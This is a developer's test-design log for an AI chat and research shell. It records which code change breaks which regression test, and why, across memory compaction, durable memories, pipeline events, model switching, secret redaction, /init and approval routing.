| Report a standing condition every step | `test_a_standing_condition_is_reported_once_per_run` | `compaction_blocked` / `compaction_failed` stay true until something changes. The control is `test_a_real_compaction_still_reports_every_time` — a compaction that happened is an event and must repeat |

### Three standing notes from this pass

**`tests/test_storage_e2e.py` is the only test running real `ConversationMemory`
against real `storage.py` on real SQLite.** Its fixture is module-scoped and that is
not a performance choice: declaring a SQLModel table registers it on
`SQLModel.metadata`, so importing `storage` twice against real sqlmodel raises "Table
'conversationthread' is already defined". Modules are popped and re-imported, never
reloaded, for the same reason. If you add a test there, do not give it its own swap.

**That file's regression test adds exactly ONE turn between compaction rounds.** Three
turns makes it pass against the broken code — the archive then grows faster than the
view-space floor shrinks and the watermark limps forward anyway. One turn is also the
production pattern: after a compaction the thread is still near the threshold, so the
next turn compacts again. Do not "tidy" that number.

**A guard that cannot fire through the normal path needs a direct test.** Once M11's
root fix is in, the watermark never goes backwards, so `save_checkpoint`'s refusal and
`compact()`'s no-progress skip are unreachable from `compact()`. They are tested by
calling them directly. A guard with no test making it fire is indistinguishable from a
guard that does not work — the first revert-check pass of this fix reported four
MISSes for exactly that reason.

## §21b — durable memory (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Ignore `project_path` when listing | `test_a_project_memory_is_invisible_from_another_project` | M12. D25 keys project memories to the resolved path; with only a `scope` string, AC6 is unwriteable as a test rather than merely unenforced |
| Stamp a global row with a project path | `test_a_global_memory_records_no_project_path` | It is then global in name and project-scoped in effect the moment anything filters on the column |
| Return everything when no project resolved | `test_no_resolved_project_means_no_memories_at_all` | `get_project_path()` is None exactly when `initialize()` has not run — "there is no session", not "this session is outside a project" |
| List oldest first | `test_memories_come_back_newest_first` | M14 keeps the most recent N, so the ordering decides which memories survive the cap |
| Make `forget_memory` raise on an unknown id | `test_forgetting_an_unknown_id_reports_rather_than_raises` | The id came from a human reading a list |
| Treat `agent=None` as opted OUT | `test_a_plain_chat_turn_counts_as_opted_in` | M13. `system_prompt_for` is unreachable without an agent, so the feature would be invisible in the default shell — the §25 shape |
| Drop the `use_memory` check at the assembly | `test_an_opted_out_agent_gets_no_fragment` | How the compactor and pipeline reviewer stay out of a user's durable facts |
| Remove M14's cap, or truncate silently | `test_the_cap_limits_how_many_reach_the_prompt`, `test_truncation_is_stated_in_the_prompt_the_model_reads` | Unbounded growth is what §21 exists to fight. The message goes to the MODEL, not only to a log — a log line reaches nobody mid-conversation |
| Announce truncation that did not happen | `test_nothing_is_said_about_truncation_when_none_happened` | The control. "Showing N of N" on every prompt is noise that trains the reader past the real one |
| **Append the fragment inside `with_catalogs()`** | `test_no_memory_reaches_a_research_pass_prompt` | **§19's K6, second instance.** That function feeds `pass_prompt()`, so every user memory would land in all ten research passes from a shell that wrote none of them |
| Stop appending in `run_agent_conversation` | `test_a_real_chat_turn_sends_the_memories` | The CALL SITE. A first version of that test exercised `with_memories` directly and stayed green through this revert — a helper existing proves nothing if nobody calls it |
| Append for an agent-built prompt too | `test_a_real_chat_turn_with_an_agent_prompt_does_not_double_up` | It already went through `system_prompt_for`; repeating pays twice for the tokens M14's cap bounds |
| Un-gate `remember`, or gate `pin` | `test_remember_requires_approval_and_pin_does_not` | D26 asserted as the PAIR it is — either half alone reads as arbitrary. Note `remember: bool = True` appears in BOTH permission dataclasses; reverting the wrong one proves nothing |
| Remove `remember` from `PIPELINE_UNGRANTABLE` | `test_remember_cannot_be_granted_to_a_research_run` | M17. No `approval_check` means R2 calls it grantable, so one `--grant remember` would let ten unattended passes write durable memories — what D26's consequence 1 forbids |
| Drop the content or the reach from the approval notice | `test_the_notice_shows_the_exact_content`, `test_the_notice_distinguishes_global_from_project_reach` | The gate is only worth having if the prompt shows what it is gating |
| Coerce an unknown scope to the default | `test_an_unknown_scope_is_refused_rather_than_coerced` | A model asking for "global" and getting a project row believes a preference follows the user everywhere when it does not |
| Write a project row with no resolved project | `test_a_project_memory_with_no_resolved_project_is_refused` | `list_memories` matches project rows on the path, so it could never be read back — invisible rather than wrong, which is worse |
| Give a piped run a provider | `test_a_piped_session_stays_headless`, `test_a_piped_chat_turn_carries_none` | M16. Matching `build_review_consent`: nobody is there to ask, so `remember` must not fire |
| Make chat use attended's `honour_run_scope=False` | `test_the_chat_provider_honours_run_scope` | Chat wants §18's per-run shortcut; attended research exists for per-call supervision. The two builders must not converge |
| Stop passing the authorization from `run_chat` | `test_a_chat_turn_carries_the_authorization` | Same call-site lesson as above, applied before it could repeat |
| Let `/forget` match a content substring | `test_forget_refuses_a_substring_rather_than_guessing` | A substring hitting two memories has to pick one, and picking silently deletes what the user did not name |
| Drop `/forget`'s empty-argument check | `test_forget_with_no_argument_explains_itself` | Asserted on "Usage:" and NOT on "/memories", which both branches mention — the first version of this row stayed green through the revert for exactly that reason |

### Two standing notes

**Prompt assembly now reads storage.** Any test that initializes `config_loader` AND
builds an agent or chat prompt needs the `fake_storage` fixture — five existing tests
gained it here. A test that does *not* initialize the loader is unaffected, because
`get_project_path()` returns None and the manager answers with nothing.

**`test_compaction_e2e.py` is now `tests/test_storage_e2e.py`** and is the home for
every real-`storage.py` test, not just compaction's. The one-swap rule in the §21a
notes above still applies and is the reason it is one file.

## §22 — pipeline observability (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Stop advancing `_Progress._emitted` | `test_the_watermark_only_moves_forward` **and every other test in the file hangs** | The `while` loop never terminates, so the generator yields the same line forever. A hang, not a failure — kill the run rather than waiting for the timeout |
| Persist AFTER emitting in `checkpoint()` | `test_abandoning_the_generator_leaves_the_record_running` | A generator only advances while someone iterates it, so a consumer that abandons the run between the yield and the persist takes that checkpoint down with it. §5's durability must not depend on a UI's willingness to keep reading |
| Have the orchestrator emit events beside each existing checkpoint instead of deriving them | `test_a_line_written_the_way_review_py_writes_one_is_carried` | AC3. `run.trace` has three writers — `orchestrator.py`, `review.py` (fifteen `run.log()` calls, no checkpoints) and `json_retry.py`'s bare `trace.append()`. Deriving from the list is what carries the other two without editing them |
| Emit a `trace_line` per call site rather than per un-emitted line | `test_every_trace_line_is_emitted_exactly_once_and_in_order` | A re-emitted line is a duplicate in the transcript; a skipped one reached the database and never reached the user |
| Return the run any way other than the terminal event | `test_the_generator_and_the_wrapper_produce_the_same_run` | The wrapper would still work and a streaming consumer would silently get nothing |
| Make `run_deep_research_pipeline` the generator | `test_the_public_function_still_returns_a_finished_run`, and ~15 direct-call sites across `test_orchestrator.py`, `test_critic_routing.py`, `test_ensemble_guard.py`, `test_pipeline_storage.py`, `test_granted_calls_artifact.py` | P3/AC1. The whole point of keeping the name synchronous |
| Add an eighth field to `LoopEvent` (it has seven) | `test_loop_event_did_not_grow_an_eighth_field` | P1/AC4. §23's events are a decision to make, not a field to add quietly |
| Drop `on_pipeline_event_message`, or stop forwarding in `_forwarding` | `test_ac2_the_tui_renders_pass_boundaries_and_tiers_as_they_happen` | AC2. The panel and transcript are fed exclusively by events — nothing else could have produced a tier for a claim the canned run never had |
| Re-add the `run.trace` dump to `on_research_finished` (or the CLI's `--- Trace ---` block) | `test_the_finished_run_does_not_reprint_the_trace` | Every line already arrived as an event; both prints the whole run twice, and the second copy reads like a different artifact |
| Count `claim_tiered` events instead of keying by claim id | `test_a_re_tiered_claim_is_not_counted_twice` | 6c re-tiers the same claim once per retry round, so the tally would exceed the claim count and keep climbing |
| Name the widget's redraw helper `_render` | **every `test_tui.py` pilot test**, with `'NoneType' object has no attribute 'get_height'` | It shadows Textual's `Widget._render()`, and the traceback points at the compositor rather than at the widget |

### Standing: two ways a research double stops working

**A patch on `run_deep_research_pipeline` no longer intercepts either shell.** Both
`main.run_research` and `tui.app._start_research` call
`stream_deep_research_pipeline`, so the old target is a silent no-op that lets the
REAL pipeline run. Loud here (the fake SDK has no `.stream`), but it is the
`fetch_url` class of defect: wired, documented, doing nothing. Every research double
goes through `_stub_events` (`test_tui.py`, `test_review.py`) or `_events_for`
(`test_e2e.py`).

**A plain-function double for a generator is NOT an error.** `_run_pass`,
`_run_pass_with_json_retry` and `_review_stage` are reached through `yield from`, so a
double returning `"REPORT"` makes it iterate the string one character at a time and
return `None` — the symptom is a report of `None` several asserts later. Use
`test_review.py`'s `_as_generator`, and `conftest.drain()` for a direct call that wants
the return value.

## `/model` — switching provider and model mid-session (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Drop the `_busy` guard | `test_model_is_refused_mid_turn` | Swapping under a running worker leaves the transcript claiming one model while the thread records another. Same guard `/new`, `/research` and the thread picker use |
| Stop upper-casing the provider argument | `test_model_switches_both_when_given_a_provider` | `providers.json` keys are upper-case, so `/model openai gpt-4o` would be rejected as unknown |
| Skip the effort re-validation after a switch | `test_switching_model_revalidates_the_effort_level` | Effort is per-MODEL. A level the old model accepted can be rejected outright by the new one, and every later turn fails with a provider 400 — the exact failure the mount-time check exists to stop, reachable again through a switch |
| List providers with no `API_KEY` as configured | `test_bare_model_reports_without_changing_anything` | It sends the user at a provider whose every call 401s |
| Refuse instead of warn on an empty `API_KEY` | `test_a_provider_with_no_key_warns_but_still_switches` | An OpenAI-compatible endpoint running locally legitimately needs no key; refusing blocks a real configuration |
| Accept an unknown provider name | `test_an_unknown_provider_changes_nothing` | `api_initialization` raises the same `ValueError` on the next turn, a long way from the typo that caused it |
| Set the attributes without `refresh_status()` | `test_the_header_shows_which_model_the_next_turn_uses` | The mount banner scrolls away, so nothing on screen says what the next turn will call |
| Read `app.model` anywhere other than at turn start | `test_the_new_model_reaches_the_next_model_call` | Asserted on `call_model_stream`'s arguments — setting the attribute proves only that the attribute was set |

## Tool-failure containment, the arXiv endpoint, and TUI logging (2026-08-05)

Found by running a real research pipeline: `arxiv_search` failed a finished
ten-pass run, and every warning it logged scribbled over the Textual screen.

| Change | What breaks | Fix / why |
|---|---|---|
| Revert `arxiv.ARXIV_API_URL` to `http://` | `test_the_endpoint_is_https` | arXiv 301-redirects it. httpx does NOT follow redirects by default, `raise_for_status()` only raises on >= 400, and the redirect body is empty — so `ET.fromstring("")` raises `ParseError`, three identical retries run, and the tool reports "failed after 3 attempts" for what is actually a scheme change |
| Drop `follow_redirects=True` from `_call_arxiv_api` | `test_redirects_are_followed` | Belt and braces beside https://. If arXiv moves the endpoint again this keeps working rather than failing as an unparseable empty body |
| Make `arxiv`/`web_search` raise after retries again | `test_arxiv_returns_an_error_after_exhausting_retries`, `test_web_search_returns_an_error_after_exhausting_retries` | One transient network failure inside one pass flipped a finished ten-pass run to `status='failed'`. `fetch_url` always returned an error dict; these two were the outliers |
| Remove `dispatch()`'s try/except around `spec.handler` | `test_an_exception_becomes_an_error_result`, `test_a_pipeline_pass_sees_an_error_result_not_an_exception` | The backstop for every future tool and every MCP server — third-party code that can raise anything |
| Catch `ToolCallDenied` in that block | `test_a_policy_denial_still_raises` | A policy denial is the caller's to handle and must stay distinguishable from a tool crash. Every raise of it is above the handler, so a correct implementation never reaches the except at all |
| Downgrade `logger.exception` to `warning` there | `test_the_traceback_is_logged_so_a_real_bug_stays_findable` | The traceback is how a genuine handler bug stays findable now that it no longer crashes the process |
| Route the error result around `check_output_policy` | `test_the_error_result_goes_through_secret_redaction` | An exception message carries the request that produced it — for an HTTP client, a URL with an API key in the query string. Redacting only the success path makes a FAILING tool the way secrets escape |
| Attach the stderr handler in the TUI | `test_stderr_false_attaches_no_stream_handler`, `test_reconfiguring_without_stderr_removes_the_existing_one` | Textual owns the terminal; stderr paints over the rendered screen, sits over the input bar and behind the panels, and vanishes at the next repaint |
| Default `configure_logging(stderr=...)` to False | `test_stderr_defaults_to_on` | The CLI is unchanged. A flipped default silences every non-TUI run |
| Drop `TranscriptLogHandler`, or its `on_unmount` removal | `test_a_warning_reaches_the_transcript`, `test_the_handler_is_detached_when_the_app_unmounts` | Without the handler, dropping stderr makes warnings invisible until someone reads `logs/app.log`. Without the removal it holds a reference to a dead app and stacks one handler per instance across this suite |
| Let `TranscriptLogHandler.emit` raise | `test_a_handler_failure_cannot_take_the_app_down` | emit() runs on whichever thread logged — a research worker, the MCP bridge. A handler that throws inside a message pump kills the app over a diagnostic |
| Route INFO to the transcript too | `test_info_is_not_routed_to_the_transcript` | Noise in a chat transcript; the rotating file already has it with timestamps |
| Warn per call in `context_limit()` | `test_the_unknown_model_warning_is_said_once_per_model` | `thresholds()` is called on every evaluation and `_maybe_compact` runs at the top of every step, so an unknown model warned twice a step across ten passes |
| Dedupe on a single boolean instead of the model | `test_a_second_unknown_model_is_still_reported` | A run that switches model, or a pipeline whose critic model differs (§11), must still hear about the second one |

### Standing: `compaction._context_window_warned` is module state

`tests/test_compaction.py` clears it in an autouse fixture. Without that, whether
`test_an_unknown_model_warns_about_its_assumed_window` passes depends on which
tests ran first — the kind of order dependency that reads as a flake.


## The truncated-pass cascade and the research budget (2026-08-05)

From a live run: Pass 1 made 14 tool calls, crossed the 250k chat budget, and
returned a tool-calling response with empty text. The orchestrator stored `""`
as `raw_response`; Pass 2 correctly reported it had nothing to extract; the run
died in `Claim`'s constructor three passes later.

| Change | What breaks | Fix / why |
|---|---|---|
| Drop `_check_not_truncated` from `_run_pass` | `test_an_empty_truncated_pass_raises_naming_the_stop_reason`, `test_max_steps_is_treated_the_same_way`, `test_whitespace_only_text_counts_as_empty` | A stop condition returns the last response as it stands, so a pass cut off mid-tool-call yields `""` and every later pass works from nothing |
| Make truncation always fatal | `test_a_truncated_pass_WITH_text_continues_and_is_traced` | A pass that produced an answer and was cut off finishing it is degraded but usable; failing there throws away work the later passes can use |
| Make truncation never fatal | `test_an_empty_truncated_pass_raises_naming_the_stop_reason` | The empty case is exactly the cascade this exists to stop |
| Check `if not response.text` instead of `.strip()` | `test_whitespace_only_text_counts_as_empty` | `"
  "` gives the next pass nothing |
| Treat a missing `stop_reason` as truncated | `test_a_response_with_no_stop_reason_is_not_treated_as_truncated` | `stop_reason` is set by `_run()`/the wrappers, never by `call_model()`. Absence is not evidence of truncation |
| Run the check AFTER `retry_until_json` | `test_a_truncated_json_pass_raises_rather_than_retrying` | A cut-off pass did not write malformed JSON. Nudging it spends more of an exhausted budget to be told the same thing, and reports a parse failure for output that was never finished |
| Revert `run_deep_research_mode` to `MAX_TOKEN_BUDGET` | `test_a_pass_runs_on_the_research_budget_not_the_chat_one` | The meter re-counts the whole prompt every step (TECHNICAL_DEBT item 9), so a tool-heavy pass burns the chat ceiling quadratically |
| Drop `max_total_tokens` from the orchestrator's `retry_until_json` call | `test_the_json_retry_carries_the_same_budget` | The retry re-enters the pass's already-large thread; the chat default would cut it off almost immediately. Same argument as the `context` parameter beside it |
| Raise `MAX_TOKEN_BUDGET` instead of adding a second constant | `test_chat_keeps_the_smaller_budget` | Raising the research ceiling must not raise the chat spend cap with it |

### Standing: `extra={}` in a log call renders as nothing

The default formatter is `%(message)s`, so `logger.warning("fetch_url failed",
extra={"url": ..., "error": ...})` prints exactly `fetch_url failed`. Every
diagnostic field is dropped. Interpolate into the message instead. This is why a
run of ordinary 404s was indistinguishable from a broken tool, and why an arXiv
scheme change hid behind three identical `arxiv_search attempt failed` lines.


## §26 — research legibility (2026-08-05)

### The one that fails by passing: doubles on `run_deep_research_mode`

`_run_pass` now iterates `RunAgentLoop.stream_deep_research_mode()`. Anything
still patched on `run_deep_research_mode` **stops intercepting and runs the real
loop** — 46 failures across 8 files, none of them at the patch site. This is
§22's twelve-doubles trap one layer down, and it is now the second recorded
instance, so treat any repoint of a call site as a repoint of its doubles.

Repointing goes through `tests/conftest.py`'s `pass_stream(source, events=())`,
which turns a double written against the old name into a generator side_effect.
Do not open-code it — fifteen bespoke wrappers is how they drift.

| Change | What breaks | Fix / why |
|---|---|---|
| `_translate` uses `for event in stream` instead of `next()` | `test_the_response_still_carries_its_thread_id` | A `for` loop SWALLOWS a generator's return value, and `thread_id` is attached after the pass's loop finishes. Every test about tool events still passes; §3's JSON retry silently opens a new thread instead of correcting the failed one |
| `run_deep_research_mode` returns the generator instead of draining it | `TestTheDrainerIsUnchanged` (both) | Its signature and return type are what every pre-§26 caller and every double depend on |
| `run_to_completion` reused as the pass drainer | `test_run_deep_research_mode_still_returns_a_model_response` | It reads the response off the terminal event, which is the copy without `thread_id`. `return_value_of` exists for the other question |
| Drop `redact_secrets` from `_param_digest` | `TestTheParamDigestIsRedacted` (2 tests) | Tool ARGUMENTS were never redacted: `check_input_policy` refuses a call, it does not redact one, and `check_output_policy` only saw results |
| Redact after truncating instead of before | `test_redaction_runs_before_truncation` | Truncation can cut a credential below the 20 characters its pattern needs, leaving the fragment unmatched. The test fixture puts the cut inside the key on purpose — with a longer surviving fragment it passes either way |
| Emit `_stage("D2")` inside the per-claim loop | `test_d2_is_announced_once_per_round_not_once_per_claim` | D2 is one decision applied to every exhausted claim; per-claim emission makes a round that exhausted six claims read as six stages. The fixture exhausts TWO claims — with one, the two behaviours are indistinguishable |
| Add a `step` kind and infer it from the event stream | — (no test; it is an absence) | `_run()` has no step marker. Within a step it yields start/result in pairs; between steps it yields nothing unless the model streamed text. See the note in `core/reasoning/events.py` |
| Forward `token_delta` text into `PipelineEvent.text` | `test_streamed_text_becomes_volume_never_content` | Seven of the ten passes emit raw JSON; only the volume escapes |
| Give `LoopEvent` an eighth field for any of this | `test_pipeline_events.py`'s P1 pin | `PipelineEvent` is the type that grows. That is what its `kind` discriminator is for |

### The TUI half

| Change | What breaks | Fix / why |
|---|---|---|
| `Transcript._styles` calls `self.app` unguarded | `test_a_widget_renders_without_a_running_app` | `self.app` raises `NoActiveAppError` rather than returning None, and widgets are constructed bare throughout the suite. Presentation degrades; it does not raise |
| Bind the claims view to `ctrl+k` | `test_ctrl_l_opens_the_claims_view_while_the_input_has_focus` | Textual's `Input` binds `ctrl+k` to `delete_right_all` and holds focus, so the binding is shadowed and pressing it deletes the typed line |
| `/theme` stops calling `rerender()` | `test_switching_theme_replays_the_transcript` | `RichLog` stores rendered segments, so everything already on screen keeps the old palette. Note the test spies on the RENDER: `_entries` survive either way, so an assertion about them alone passes with the replay removed |
| A new write path that skips `Transcript._emit` | — (silent) | The line reaches the screen and neither the `/theme` replay nor `/copy all`. Same two-writers shape §22 removed from the trace |
| `--file` also fires `copy_to_clipboard` | `test_copy_to_a_file_writes_what_it_says_it_wrote` | `--file` exists because OSC 52 cannot be confirmed; doing both makes the provable route indistinguishable from the unprovable one |

### Standing: a transcript stub must track `Transcript`'s write methods

`_StubTranscript` (`test_agents.py`), `_NullTranscript` (`test_review.py`) and
`_T` (`test_skills.py`) each stand in for the real widget. When `tui/app.py`
starts calling a new one, all three need it — the failure is an `AttributeError`
raised from inside `app.py`, nowhere near the widget that grew the method. §26
added `write_answer`, `write_role`, `rerender` and `as_text`, and made
`flush_stream` return the flushed text rather than None.

---

## 12. ROADMAP_v2 §27 — thread kinds, and the doubles that construct a memory

§27 gave `ConversationMemory.__init__` a second parameter (`kind`) and
`storage.create_thread` / `storage.list_threads` a keyword each. Nothing in
production calls them positionally, so the breakage is entirely in doubles —
and it does not fail at the double, it fails inside `core/loop.py` with a
`TypeError` about an unexpected keyword argument.

| Change | What breaks | Fix / why |
|---|---|---|
| A `ConversationMemory` double that does not accept `kind` | `TypeError: __init__() got an unexpected keyword argument 'kind'` raised from `core/loop.py`, in whichever test installed the double | `tests/conftest.py`'s `FakeMemory` and `test_cli.py`'s two `SpyMemory` classes take `(thread_id=None, kind="chat")` and RECORD the kind. Any new double does the same |
| A `FakeStorage` that does not mirror `create_thread(kind=...)` / `list_threads(kind=...)` | `TypeError` at the call, or a filter test that passes for the wrong reason | `FakeStorage` mirrors both, plus `thread_kind()` — which is NOT a production method, deliberately named differently, and exists only as §27 AC1's assertion hook |
| Remove `list_threads`' default filter, or its `kind`/`preview` row fields | `test_list_threads_returns_all_threads_most_recent_first` (shape), `test_machinery_threads_are_not_listed`, `test_list_threads_filters_by_kind_in_sql` | The row shape is asserted exactly, in the fake and against real SQL. `kind=None` is the escape hatch and must keep returning everything |
| `create_thread` stops defaulting to `chat` | Broadly red: every existing caller creates conversations by omission | The default is what keeps §27 a two-line change at three call sites instead of an audit of every thread creation |
| Replay reads `memory.messages` instead of `storage.archive_history` | `test_replaying_a_compacted_thread_shows_the_original_first_message` | T3. The derived view leads with the compaction summary, which M8 says must never be rendered as something the user said. Note the test needs a REAL compaction — the two spaces coincide until a checkpoint exists, which is how §21a's watermark defect survived 849 tests |
| Replay renders tool RESULTS | `test_a_tool_call_is_one_line_and_its_result_is_skipped` | T4. A grounding-heavy thread carries hundreds of kilobytes of fetched page text in those rows |
| A second copy of `param_digest` | `TestTheParamDigestIsRedacted` still passes — against whichever copy the test imports | §27 moved it to `safety/policy_enforcement.py` because the replay renderer is its second caller. The tests moved WITH it, so there is one place the redact-before-truncate ordering is pinned. A copy is invisible to them |
| Record a pass's thread AFTER `_check_not_truncated` | `test_a_pass_that_dies_truncated_still_records_its_thread` | That check RAISES for a pass cut off mid-tool-call, whose thread is the one most worth opening |
| Relax `classify_legacy_pass_threads`' window to include an unfinished run | 3 tests in `TestClassifyingLegacyThreads` | Both guards have to go for it to break: SQL's `x <= NULL` is already not true, so dropping either alone changes nothing. The lenient version (`finished_at IS NULL OR ...`) reads as a kindness and hides every conversation since an abandoned run |
| `ensure_columns` grows a backfill so the separate classification can go away | — (silent, then destructive) | M7's contract is additive-only. The classification is a separate function precisely so data policy stays out of the one function every launch runs through |

### Standing: `app._transcript` is a query against the ACTIVE screen

A pilot test that opens a modal (`ThreadPickerScreen`, `PermissionScreen`, …)
and then reads `app._transcript` gets `NoMatches`, because the query runs
against the pushed screen. Hold a reference to the widget BEFORE opening the
modal — `test_resuming_clears_the_screen_and_replays` does, and the comment
there says why.

---

## 13. ROADMAP_v2 §21c — the summary store, and the tier every shell owes

§21c added `storage.ThreadSummary` plus three functions, and a prompt tier that two
shells must both apply. Nothing here fails at the edit site.

| Change | What breaks | Fix / why |
|---|---|---|
| A `FakeStorage` without `latest_thread_summary` / `save_thread_summary` | `AttributeError` from inside `core/compaction.py`, in whichever test drove a summary | Both are mirrored in `_thread_summaries`, a dict kept SEPARATE from `_checkpoints` for the same reason production uses a separate table. `last_message_id` and `advances` are deliberately NOT mirrored — both read `_ordered_rows`, which is faked, so the real position arithmetic runs under test |
| Route a summary through `save_checkpoint` (or add an advance guard to `save_thread_summary`) | `test_a_thread_summary_does_not_compact_the_thread` (real SQL), `test_summarizing_does_not_change_what_the_model_sees` | M18. `latest_checkpoint` resolves by timestamp and feeds `_derived_view`, so a summary row there becomes the live watermark and folds the thread it describes. The missing guard is a decision, not an omission |
| `summarize_thread` reads `memory.messages` | `test_it_reads_the_archive_not_the_derived_view`, and the real-storage `test_a_summary_of_a_compacted_thread_describes_the_conversation` | T3's reasoning. Note the real-storage test needs a thread whose DERIVED VIEW alone exceeds `SUMMARY_TARGET_CHARS` — otherwise the view-based version stores verbatim, makes no call, and the assertions read the compaction's call instead. That is how it was wrong the first time |
| Make the summary target a `COMPACTION_TARGET_RATIOS` entry | `test_the_target_is_absolute_not_a_strength_ratio` | The consumer is a prompt tier on every turn, so nothing bounds a proportional target. The test asserts the two candidate numbers DIFFER before asserting which was used — without that it passes either way |
| Remove the fits-already branch | `test_a_short_thread_costs_no_model_call` | A thread shorter than the budget is its own best summary |
| Drop the `advances()` staleness check, either direction | `test_an_unchanged_thread_is_served_from_the_store` or `test_a_grown_thread_is_re_summarized` | Both directions matter: serving stale, and paying twice for an unchanged thread |
| Append `with_refs` inside `with_catalogs()` | `test_no_ref_reaches_a_research_pass_prompt` | K6's THIRD instance (skills, then §21b's memories). A conversation referenced in a chat session must not reach ten research passes |
| Guard `with_refs` with `if system_prompt is None`, copying the memories line above it | `test_an_agent_built_prompt_still_gets_them` | Refs are thread state, and `system_prompt_for()` has no memory object — so an active agent would silently lose every attached reference. A two-word edit that reads as consistency |
| Remove either `with_refs` call site | `test_a_real_chat_turn_sends_the_refs` or `test_the_tui_turn_sends_them_too` | Tested independently, because §21b recorded that testing only the helper leaves everything green when a call site goes |
| Make the ref cap drop the oldest | `test_the_cap_refuses_rather_than_dropping_the_oldest` | A reference is something a person chose by name; M15's rule against silent removal |
| Stop stating the cap in the fragment | `test_the_cap_is_applied_and_stated` | M14's no-silent-caps rule: the count reaches the MODEL, not only a log |
| `/summary` calls `compact()` | `test_it_shows_the_summary_without_folding_the_thread` | M20. Same summariser, different request |
| Remove the picker's `thread_id is None` guard | `test_a_dismissed_picker_does_nothing_at_all` | NOTE: an earlier version of this test asserted only "nothing was attached" and passed with the guard gone — summarising a None thread fails downstream, so refs stayed empty while the user got told "Could not summarise thread None". The assertion is on the whole outcome: no work, no output, `_busy` released |

### Standing: a shell that applies `with_goal` owes the same site a `with_refs`

Both are thread state read off `memory.extra`, and both are appended by the shells
rather than by the assembly point they share (K6). A new shell — or a new turn path in
an existing one — that applies one and not the other produces a reference that silently
does nothing on that path. The same standing note covers `with_memories`, with the
caveat that memories are conditional on there being no agent-built prompt and refs are
not.

## §14 — `/init` and the project documentation set (ROADMAP_v2 §24, `test_project_init.py`)

| Change | Breaks | Why |
|---|---|---|
| Write with `open()` instead of `registry.dispatch` | `test_the_write_goes_through_the_registry` | AC3/I1. Dispatch is what applies the approval gate, `check_input_policy` and output redaction |
| Give `write_project_doc` a `path` parameter | `TestTheScopedTools` | I1. "Cannot be aimed elsewhere" is structural because there is no path to supply — validating one instead is a weaker claim |
| Drop the document-name allowlist | `TestTheScopedTools` | The allowlist IS the confinement once the path is gone |
| Resolve `read_project_doc`'s path without `realpath` first | `test_read_follows_symlinks_before_deciding` | A link that looks contained and resolves outside is exactly the case the ordering exists for |
| Widen `read_project_doc` to any text file | `TestTheScopedTools` | A permission-`True` tool is advertised to EVERY run, not only `/init`'s. Widening it turns it into `read` with no approval gate, reachable from a research pass |
| Raise `INIT_READ_CHARS` to `MAX_READ_CHARS` | `test_read_caps_below_the_general_read_tool` | TECHNICAL_DEBT item 9: each read is re-billed on every later step |
| Drop `max_total_tokens=INIT_TOKEN_BUDGET` | `test_the_run_gets_its_own_budget_not_the_chat_one` | §26's reasoning — the chat budget cuts a tool-heavy run off early |
| Drop `thread_kind` from the initializer run | `test_the_run_is_labelled_as_a_subagent_thread` | §27: the initializer is a SIXTH thread source |
| Give the initializer a write tool | `test_the_agent_can_only_read` | I8. The agent drafts; the shell writes, because only the shell can show a human a diff |
| Let `confirm=None` proceed | `test_no_confirm_route_writes_nothing` | §25's V6, sixth instance |
| Stop passing the existing `CONTEXT.md` to the agent | `test_an_existing_context_is_given_to_the_agent_to_revise` | I4. Hand edits survive by design, not by the user re-applying them after rejecting a diff |
| Overwrite documents that already exist | `test_an_existing_document_is_left_exactly_as_it_was` | I12. Only `CONTEXT.md` is a file `/init` claims to author |
| Make `render_index` depend on what is on disk | `test_a_second_run_changes_nothing` | I11, and the defect that found it: the second run rewrote `CONTEXT.md` and called files `/init` had just written "pre-existing" |
| Re-grant trust unconditionally | `test_an_untrusted_project_is_not_laundered` | I6. A cloned repo's `.venastine/` must not become trusted as a side effect of an unrelated command |
| Capture `is_trusted()` after the write | `TestWorkspaceTrust` | The hash has already moved, so a trusted project reads as untrusted and is never re-granted |
| Exclude `CONTEXT.md` from the D17 hash | `test_context_md_still_counts_towards_the_hash` | Same hole as the above, with a smaller mouth |
| Drop `_is_secret` from `manifest._tree` | `test_the_manifest_hides_credential_files` | NOTE: the identical call in `_root_documents` is currently UNREACHABLE — nothing is both "interesting" and secret — so mutating that one proves nothing. `_tree` is the load-bearing call |
| Return the raw answer from `ask_project_kind_blocking` | `test_an_unrecognised_kind_answer_cancels` | NOTE: asserting "nothing was written" passes either way, because `generate()` refuses a non-kind downstream. The test asserts the outcome that differs — a clean cancellation rather than an error quoting a value the user never chose |

### Standing: a broken `/init` modal presents as a HUNG suite, not a red one

Two mutations here — `ConfirmScreen.action_decline` dismissing with no value, and
skipping the project-kind modal so the confirmation opens unexpectedly — leave the
`/init` worker parked on `queue.get()`. That also blocks `run_test()`'s teardown, so
pytest stops rather than failing. It is the "every dismissal path carries a value"
invariant doing its job (§16 AC2's original lesson, now in its sixth place), but if the
suite hangs in `test_project_init.py`, look for a modal path that dismisses with
nothing before looking for an infinite loop.

## §15 — the response channel (ROADMAP_v2 §23 slice 1, `test_interaction.py`)

| Change | Breaks | Why |
|---|---|---|
| Make `decode` return the raw value | `TestReview`, `TestChoice` | The whole module exists so one function decides what a non-answer means |
| Make `ask(None, request)` permissive | `TestEveryRouteDeclines` | §25's V6: the inability to ask is not permission to proceed |
| Narrow `ask`'s `except Exception` | `TestEveryRouteDeclines` | A shell that raises must decline, not propagate into the loop |
| Give a kind a permissive default | `test_every_default_declines` | The asymmetry IS the design |
| Return a default for an unknown kind | `test_an_unknown_kind_raises_rather_than_defaulting` | An undefined question is a bug; inventing "no" hides the typo |
| Accept a bare `"accept"` string for review | `TestReview`, `test_the_modal_answer_decoder_fails_safe` | The one kind whose permissive failure APPLIES an edit. The two decoders this replaced disagreed here |
| Test sign-off emptiness with `if raw:` | `TestSubagentSignoff` | Folds "spawn with nothing granted" into "refuse the spawn" — the middle of three answers |
| Drop the candidates intersection | `test_a_name_that_was_not_offered_is_not_granted` | A shell must not grant a tool nobody offered. Only possible because `decode` takes the request |
| Drop the options check on a choice | `TestChoice` | Same, and it is the guard §24 shipped by hand and untested |
| Pass the kind to `decode` instead of the request | everything above | Two kinds become unverifiable |

### §23's migration, in the files it touched

| Change | Breaks | Why |
|---|---|---|
| Bypass `interaction.ask` in `_obtain_approval` | `test_streaming_loop.py`, `test_attended.py` | One route is the point |
| `headless = False` | `TestHeadlessIsAboutBeingUNABLEToAsk` | "No way to ask" is one condition again |
| Ignore `honour_run_scope` | `TestRunScope` | §25 R11: attended mode must re-ask |
